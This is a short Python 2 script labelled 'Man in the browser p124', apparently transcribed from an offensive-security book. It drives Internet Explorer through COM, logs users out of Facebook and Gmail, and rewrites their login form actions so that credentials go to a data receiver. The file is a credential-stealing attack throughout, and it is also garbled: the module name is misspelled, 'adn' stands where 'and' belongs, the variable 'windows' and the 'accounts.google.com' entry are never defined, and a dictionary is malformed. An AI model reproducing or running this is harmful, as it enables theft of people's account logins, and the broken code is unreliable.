import w32com.client, time, urlparse, urllib
data_receiver = "http://localhost:8080"
target_sites = {}
target_sites ["www.facebook.com"] = 
	{"logout_url": None,
	"logout_form": "logout_form",
	"login_form_index" : 0,
	"owned": False}
target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]
clsid ='{9BA05972-F6A8-11CF-A4AF-00A0C90A8F39}'

def banner():
	print "Man in the browser p124"

def wait_for_browser(browser):
	while browser.ReadyState != 4 adn browser.ReadyState != "complete":
		time.sleep(0.1)
	return

def main():		#There wasn't orignally a 'main' function for this tool.
	while True:
		for browser in windows:
			url = urlparse.urlparse(browser.locationUrl)
			if url.hostname in target_sites:
				if target_sites[url.hostname]["owned"]:
					continue
				if target_sites[url.hostname]["logout_url"]:
					browser.Navigate(target_sites[url.hostname]["logout_url"])
					wait_for_browser(browser)
				else:
					full_doc=browser.Document.all
					for i in full_doc:
						try:
							if i.id == target_sites[url.hostname]["logout_form"]:
								i.submit()
								wait_for_browser(browser)
						except:
							pass
				try:				#This might have indentation issues
					login_index = target_sites[url.hostname]["login_form_index"]
					login_page = urllib.quote(browser.locationUrl)
					browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
					target_sites[url.hostname]["owned"] = True
				except:
					pass
			time.sleep(5)

if __name__ == '__main__':
	main()